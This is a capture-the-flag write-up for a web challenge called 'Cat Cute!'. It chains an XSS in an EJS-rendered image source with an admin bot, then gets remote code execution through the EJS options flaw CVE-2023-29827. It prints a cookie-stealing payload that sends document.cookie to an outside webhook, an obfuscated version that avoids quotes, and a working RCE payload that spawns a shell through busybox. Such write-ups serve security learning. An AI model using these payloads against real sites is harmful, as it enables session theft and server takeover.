## Cat Cute!

<img src="images/chall.png" width=600>

The webpage backend has an `/admin` endpoint which requires authentication, as well as an admin bot that sets a cookie with the admin token before visiting an endpoint on the home page.  

```js
export const report = async (endpoint) => {
	if (!endpoint.startsWith("?src=")) {
		throw new Error(
			"Invalid endpoint. Make sure to have the '?src=' query parameter."
		);
	}

	const browser = await puppeteer.launch({
		headless: "new",
		args: [
			"--disable-gpu",
			"--no-sandbox",
			"--js-flags=--noexpose_wasm,--jitless",
		],
		executablePath: "/usr/bin/chromium-browser",
	});

	const page = await browser.newPage();
	await page.setCookie({
		name: "admin",
		value: adminCookie,
		domain: "localhost",
		path: "/",
		//httpOnly: true,
	});

	await page.goto(`http://localhost:3000/${endpoint}`);

	await new Promise((resolve) => setTimeout(resolve, 1000));

	await browser.close();
};
```

On the homepage, we can control the image source being rendered.  

```js
app.get("/", (req, res) => {
  res.render("index", {src : req.query.src});
});
```

The homepage template is vulnerable to XSS, as we can inject `x onerror=location.href=<webhook>+document.cookie` into the `src` attribute to exfiltrate the admin cookie when we report it. However, the template uses `<%=` to render our payload, so quotes are blacklisted.  

```html
<script>
    main.innerHTML=`<img class=background src=<%= src ?? "/static/cat.jpg" %>>`;
</script>
```

We can use some obfuscations to construct the string.  

```js
[String(/http:/).slice(1,-1),String(function(){/**/})[11],String(function(){/**/})[11],String(/ykbtagd.request.dreamhack.games/).slice(1,-1),String(function(){/**/})[11],document.cookie].join(String())
```

After reporting our xss payload, our webhook will then retrieve the admin token which we can use to access the `/admin` endpoint.  

<img src="images/token.png" width=600>

The `/admin` endpoint only renders a simple message and we can't pass in anything to be rendered, so this isn't simple SSTI.  

```html
<!-- admin.ejs -->
<h1> hello admin!</h1>
```

However, the backend does show that we can control the EJS rendering options.  

```js
app.get('/admin', (req,res) => {
  if (req.cookies?.admin === adminCookie) {
    res.render('admin', {...req.query});
  }
  else{
    return res.status(403).send("You are not Admin!");
  }
})
```

In `package.json`, the `ejs` version used by the website is `3.1.9`, which is affected by [CVE-2023-29827](https://nvd.nist.gov/vuln/detail/CVE-2023-29827).  

```json
{
  "type": "module",
  "dependencies": {
    "cookie-parser": "^1.4.6",
    "ejs": "^3.1.9",
    "express": "^4.18.2",
    "express-rate-limit": "^6.9.0",
    "puppeteer": "^21.0.1"
  }
}
```

We can use a similar exploit detailed in [this writeup](https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/#root-cause) to get RCE.  

The `/admin` endpoint uses an ESM environment, so `require()` isn't available. Instead, we can use `process.binding` to load `spawn_sync`.  

The Docker image uses `node:18-alpine` so `/bin/sh` isn't available, thus we need to use `/bin/busybox` and `ash` to run linux commands.  

```js
settings[view options][client]=true&settings[view options][escapeFunction]=(() => {});
	const result = process.binding('spawn_sync').spawn({
		file: '/bin/busybox',
		args: ['ash', '-c', 'ls'],
		stdio: [
			{ type: 'pipe', readable: true, writable: false },
			{ type: 'pipe', readable: false, writable: true },
			{ type: 'pipe', readable: false, writable: true }
		],
	});

	return `${result.output[1]}\n${result.output[2]}`;
```

Sending the payload will run `ls` and show `flag.txt` in the current directory, which we can read to get the flag.  

<img src="images/rce.png" width=600>

Flag: `bisc2023{C@ts_aRe_s0_cuTe!}`